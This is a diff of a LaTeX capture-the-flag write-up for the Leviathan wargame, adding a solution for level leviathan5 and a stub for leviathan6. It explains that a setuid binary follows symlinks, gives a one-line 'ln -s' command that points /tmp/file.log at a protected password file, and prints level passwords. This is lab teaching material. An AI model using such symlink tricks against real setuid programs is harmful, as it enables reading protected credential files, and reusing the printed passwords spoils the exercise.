@@ -150,9 +150,18 @@ echo 01000001 01000010 | perl -lape '$_=pack"(B8)*",@F'
 
 \subsection*{leviathan5}
 \pass{Tith4cokei}
-\chall
+\chall There is a \textit{SETUID} executable in the home directory, it reads the file \textit{/tmp/file.log}, then deletes it. Inspection using \textbf{ltrace -S}, reveals that the executable does not check if the file is a symbolic link.
+\begin{lstlisting}[deletekeywords={file}]
+ln -s /etc/leviathan_pass/leviathan6 /tmp/file.log
+\end{lstlisting}
+
+\subsection*{leviathan6}
+\pass{UgaoFee4li}
+\chall 
 \begin{lstlisting}
 \end{lstlisting}
+
+
 
 
 \section*{Links \& resources}
